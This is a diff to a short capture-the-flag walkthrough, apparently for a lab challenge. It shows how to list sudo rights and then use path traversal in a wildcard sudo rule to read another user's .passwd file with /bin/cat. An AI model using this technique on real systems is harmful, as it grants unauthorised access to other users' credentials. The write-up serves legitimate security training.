@@ -5,6 +5,6 @@ To read the .passwd located in the following PATH:
 /challenge/app-script/ch1/ch1cracked/
 we need to know what command we may run as sudo.
 With 'sudo -l' command we can see this command.
-In this task we can run /bin/cat as user app-script-ch1-cracked in /challenge/app-script/ch1/ch1/*
+In this task we can run /bin/cat as user app-script-ch1-cracked in /challenge/app-script/ch1/notes/*
 To run command as another user:
-sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
+sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
